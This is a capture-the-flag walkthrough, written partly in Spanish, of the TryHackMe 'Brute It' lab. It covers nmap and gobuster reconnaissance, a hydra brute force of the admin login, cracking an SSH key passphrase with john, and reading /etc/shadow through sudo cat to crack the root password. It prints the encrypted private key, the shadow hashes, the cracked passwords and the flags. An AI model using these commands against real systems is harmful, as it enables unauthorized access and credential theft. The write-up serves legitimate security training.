

## Task 1

## Task 2  - Recon

### Search for open ports using nmap. How many ports are open?

```
nmap -n -Pn -sV 10.10.192.172 --min-rate 5000 -vv -oN bruteir
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 22:48 CDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 22:48
Scanning 10.10.192.172 [1000 ports]
Discovered open port 22/tcp on 10.10.192.172
Discovered open port 80/tcp on 10.10.192.172
Increasing send delay for 10.10.192.172 from 0 to 5 due to 412 out of 1371 dropped probes since last increase.
Increasing send delay for 10.10.192.172 from 5 to 10 due to 86 out of 286 dropped probes since last increase.
Completed SYN Stealth Scan at 22:48, 0.97s elapsed (1000 total ports)
Initiating Service scan at 22:48
Scanning 2 services on 10.10.192.172
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 22:48, 6.54s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.192.172.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:48
Completed NSE at 22:48, 0.97s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:48
Completed NSE at 22:48, 1.03s elapsed
Nmap scan report for 10.10.192.172
Host is up, received user-set (0.19s latency).
Scanned at 2024-10-10 22:48:35 CDT for 10s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
           Raw packets sent: 1755 (77.220KB) | Rcvd: 1709 (68.368KB)

```

Ans>

2
 
### What version of SSH is running?

Ans>

OpenSSH 7.6p1
 
### What version of Apache is running?

Ans >
2.4.29
 
### Which Linux distribution is running?

Ans>
Ubuntu
 
### Search for hidden directories on web server. What is the hidden directory?

```
gobuster dir -u http://10.10.192.172 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 150        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.192.172
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.192.172/admin/]

```

## Task 3 - Getting a shell

### What is the user:password of the admin panel?

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="[styles.css](view-source:http://10.10.192.172/admin/styles.css)">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="[](view-source:http://10.10.192.172/admin/)" method="POST">
            <h1>LOGIN</h1>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>
```

- El nombre de usuario en el comentario
```
 <!-- Hey john, if you do not remember, the username is admin -->
```

- aplicamos hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.192.172 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -t 64 -f    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-10 22:57:09
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.192.172:80/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid

[80][http-post-form] host: 10.10.192.172   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-10 22:57:30

```

Ans>
xavier

## Task 3 - Getting a shell

### What is the user:password of the admin panel?
Ans>

adim:xavier

### Crack the RSA key you found.What is John's RSA Private Key passphrase?

- Nos loguemos en el panel
- Descargamos la llave

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----
```

- la creakeamos con jhon
```
──(kali㉿kali)-[~/tryhackme/brute-it]
└─$ ssh2john id_rsa > id_rsa.txt                                      
                                                                                                   
┌──(kali㉿kali)-[~/tryhackme/brute-it]
└─$ ls -la
total 20
drwxrwxr-x  2 kali kali 4096 Oct 10 23:02 .
drwxrwxr-x 14 kali kali 4096 Oct 10 22:44 ..
-rw-rw-r--  1 kali kali 1302 Oct 10 22:48 bruteir
-rw-rw-r--  1 kali kali 1766 Oct 10 23:00 id_rsa
-rw-rw-r--  1 kali kali 2458 Oct 10 23:02 id_rsa.txt
                                                                                                   
┌──(kali㉿kali)-[~/tryhackme/brute-it]
└─$ cat id_rsa.txt      
id_rsa:$sshng$1$16$E32C44CDC29375458A02E94F94B280EA$1200$2423ec7a7b726dd092c7c40c39c58a9c802c9c84444e3663cfa00b2645f79ca488e2de34cbc59f59f901883aafc4b22652b16edfefd40a65f071e5bab89ed9e42a6a305a5440df28194c5c98e74f03cf1ba44066507fef0f62bf67e2a0d2f63406f6d3cf75447295c9ca0b68f56460dccf57495b26b31a5a0049785c137c12694a02447e14b8f6d6a6f33f337c63b6ca1d84342f8de322e94d28e12af636c8f0ed5ce58530a30b5594f04d4a5cd132e12171e2756d80d6c94424df3a552da5f2f99de666d32ae4d9008e2765a25d59b70331bf00f2e3bf038f135067b791fdca109aada38f7b4178a1fd0173999434305077e61260705c734af364e9ff6796fd293ca6c2e7804b2f0153cb7b1792e5002bb3ec063d9a7572957589273702754154ec5a078bb3cd35d48cfd87f19ebc6b7e01f2d31d7a3d0c2c70b5294716aa0ca2fcc76aea5f077a89413146dc173a80bdb566f3ee838593ef738174d1bce50ef5b6ddbda923846b688f1f9c45c7b72eab7e426e1cd551f8df1975a61904e0ddfe7d1ad1f4d0d4ddfad4a146af9105ecb5f8a8a273d9c3f69bbab148f9ad64083319abd4475243bc25f3ca36cf79c591cb472e0a6a7c042f8f778b37cb76fab6a36e85aac97d9499e81d1e37df7ddba2799deec6d419b23ef3e3ef06f92ae5b5c8a1a7df60cbfc19fe6b8a117969e01cc2c3a3fe319b1789ae99ada2fc2624e5e8e68f94784537cb0afeb140497375bca1439735f4308dd357324815b297fcc3b6c679cb9c15d988d2c0e2606364e6ebe6c148ee91f54b4fd24f30df213a7b3ba27c3ef47f8560551b11e58ebbb429a86453658a0a26b5d2af3208dd8166c44f6edd41cb3aaa83508b078c771c9a7ab1cd10d27e406403a22d22ac79e7e704d1fd2c7687d7b6fcef0915816b9185681b4d26117de342f1f717db770384673043c1866f16fddcd5578f4d3d30bd6c9bbe8d2a2537dab81d7244633597ba1c076c221e06414f13d50e36f8a9f553f0534f7f5ec3cff0634435082a832eee04e27e99c1fa2c38e3d716db2e77f14f8e98ea891399b2abe53422463dcb27600c1eaeb86adf900629e8d0ef3c5ef53e088085caf38201ae0eada38b3a1e1f53aaf72bede299f743c77c12fb82b37db8eb89793bedb0f93d807a23e5ef8fb1ce48466b511c3c96afa63a208a8d04e550046af87a61e6bfae21ce1de32241d42533eb4d0ba60ead50c4522703199195a1144e6768036e387ac4465ec6a29cf439adf496c97d8a1b046ef4d950bb129c621c678998967f7035c50e12759419e417caa199342dce21281320770fcca252f5bcc516991a53909d95a2932286b49448ac666f39c0fa04a412cd8a28dfabcd3cae14ed00152d1c8d0c7c9e613a3c2f336cc746836eed6b502fbcdc3c89c1423138299de963c28fcd29fe69e78dc178db0c20395b5776e7a44015d9e4aa70be65e36feca8c8f0a025b895c3052d9a065c50df01cd0f281703d74eccd4620363839445823fcc0584eb68be9560301ea67e18a3075a025bf733c20244a43719b40457a6429a20ca00cc772b7549a6c638695e766aee71e37768e9edf1c93491ec4d9b7ec51b9738f66fe9995eb9b1b2df970d4eaec756bd4eb96e9d37092592562ab31310be0b4563f0474b6c6f6e6d3ae52be833ff1ebe7630b68b835c88191f35711f96
                                                                                                   
┌──(kali㉿kali)-[~/tryhackme/brute-it]

```

- ahora si pacatelas
```
john id_rsa.txt -w=/usr/share/wordlists/rockyou.txt     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2024-10-10 23:03) 33.33g/s 2420Kp/s 2420Kc/s 2420KC/s rubicon..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

ANS>
rockinroll

### El user.txt

```
ssh -i id_rsa john@10.10.192.172  
The authenticity of host '10.10.192.172 (10.10.192.172)' can't be established.
ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.192.172' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 11 04:06:09 UTC 2024

  System load:  0.0                Processes:           103
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 39%                IP address for eth0: 10.10.192.172
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106

john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}

```
ANS>

THM{a_password_is_not_a_barrier}

## Task 4 - Privilege Escalation

### Find a form to escalate your privileges. What is the root's password?

```
sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
john@bruteit:~$ 


┌──(kali㉿kali)-[~/tryhackme/brute-it]
└─$ cat elhashdelroot 
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/tryhackme/brute-it]
└─$ john elhashdelroot -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:00:00 DONE (2024-10-10 23:13) 7.692g/s 1969p/s 1969c/s 1969C/s 123456..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 



```

ANS>

football
### EL root.txt



```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
john@bruteit:~$ sudo /bin/cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```


### Por aca tambien

```
ohn@bruteit:~$ su root
Password: 
root@bruteit:/home/john# cat user.txt 
THM{a_password_is_not_a_barrier}
root@bruteit:/home/john# cd /root
root@bruteit:~# cat root.txt 
THM{pr1v1l3g3_3sc4l4t10n}
root@bruteit:~# 

```